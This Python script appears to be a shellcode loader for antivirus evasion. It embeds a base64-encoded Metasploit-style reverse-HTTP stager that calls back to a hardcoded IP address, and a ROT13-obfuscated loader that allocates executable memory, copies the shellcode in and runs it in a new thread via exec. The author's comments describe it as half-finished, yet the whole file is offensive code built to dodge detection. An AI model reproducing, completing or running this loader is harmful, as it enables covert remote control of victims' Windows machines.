# -*- coding: utf-8 -*-
# @Time    : 18 2月 2025 1:43 下午
# @Author  : codervibe
# @File    : msf加密替换免杀.py
# @Project : pythonBasics
"""
半成品 无法执行的 半混淆代码
"""
import ctypes
import base64
# b'_EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj_yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv_gWEFZWkiLEulP____XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH_9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn_9Xrc1pIicFIMdJJidhNMclSaAACQIRSUkG661UuO__VSInGSIPDUGoKX0iJ8UiJ2knHwP____9NMclSUkG6LQYYe__VhcAPhZ0BAABI_88PhIwBAADr0-nkAQAA6KL___8vb0dQVwCAWDtzBi_s-KwSzR41Fxp6_egUlW9A7w2EyzueuLtC6fQuzIz99_hXyz69y0a6ijCJNsXqmkAJnZ8FaxJm5cmE6Ow4PF-CP7QQAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA1LjE7IFRyaWRlbnQvNC4wOyBTVjEpDQoAmEIGMqchYmCfIzNNjvYt8ogGFgzS8Si_gEaJVKtVvFYFCQtWpNlAzt0-d85MmGgFdKJxynBnX2HoiuR9f82FpCl92ZCexAbxkTXvr--4l1Ws-FBGwdV1icYR0Y55ws3a2SMtZDmWpdg-iaUzlnZZdi6rhBCN17yqQi70Cpr5FcwNT8-ujnXpSlV1EaKNfwlxMHnDvDJoWc_mil4f-FT3KaBSJdpkJvOynlrmsTFRTjhWuXLUEFZaS0UYER-UC-IdASfFYlShCmgQhoJfQcoPwt8dph7yWlrkk4zipwBBvvC1olb_1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl_9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni_9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw-if_f__NDMuMTYyLjEyMS4xNDcAEjRWeA*/*/'
# 定义一个 byte 对象
sc = b'_EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj_yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv_gWEFZWkiLEulP____XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH_9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn_9Xrc1pIicFIMdJJidhNMclSaAACQIRSUkG661UuO__VSInGSIPDUGoKX0iJ8UiJ2knHwP____9NMclSUkG6LQYYe__VhcAPhZ0BAABI_88PhIwBAADr0-nkAQAA6KL___8vb0dQVwCAWDtzBi_s-KwSzR41Fxp6_egUlW9A7w2EyzueuLtC6fQuzIz99_hXyz69y0a6ijCJNsXqmkAJnZ8FaxJm5cmE6Ow4PF-CP7QQAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA1LjE7IFRyaWRlbnQvNC4wOyBTVjEpDQoAmEIGMqchYmCfIzNNjvYt8ogGFgzS8Si_gEaJVKtVvFYFCQtWpNlAzt0-d85MmGgFdKJxynBnX2HoiuR9f82FpCl92ZCexAbxkTXvr--4l1Ws-FBGwdV1icYR0Y55ws3a2SMtZDmWpdg-iaUzlnZZdi6rhBCN17yqQi70Cpr5FcwNT8-ujnXpSlV1EaKNfwlxMHnDvDJoWc_mil4f-FT3KaBSJdpkJvOynlrmsTFRTjhWuXLUEFZaS0UYER-UC-IdASfFYlShCmgQhoJfQcoPwt8dph7yWlrkk4zipwBBvvC1olb_1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl_9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni_9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw-if_f__NDMuMTYyLjEyMS4xNDcAEjRWeA*/*/'

_0x1a3f = sc.replace(b'-', b'+').replace(b'_', b'/').replace(b'*/', b'=')
# print(_0x1a3f)
_0x59c2 = base64.b64decode(_0x1a3f)

# _0x59c2 = _0x59c2.hex()
# print(f"{_0x59c2}")
"""上面的混淆 没有和下面的代码进行匹配修改"""
def rot13(message):
    res = ''
    for item in message:
        if (ord(item) >= ord('A') and ord(item) <= ord('M')) or (ord(item) >= ord('a') and ord(item) <= ord('m')):
            res += chr(ord(item) + 13)
        elif (ord(item) >= ord('N') and ord(item) <= ord('Z')) or (ord(item) >= ord('n') and ord(item) <= ord('z')):
            res += chr(ord(item) - 13)
        else:
            res += item
    return res

loader = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(_0k59p2), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(_0k59p2), yra(_0k59p2));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
exec(rot13(loader))

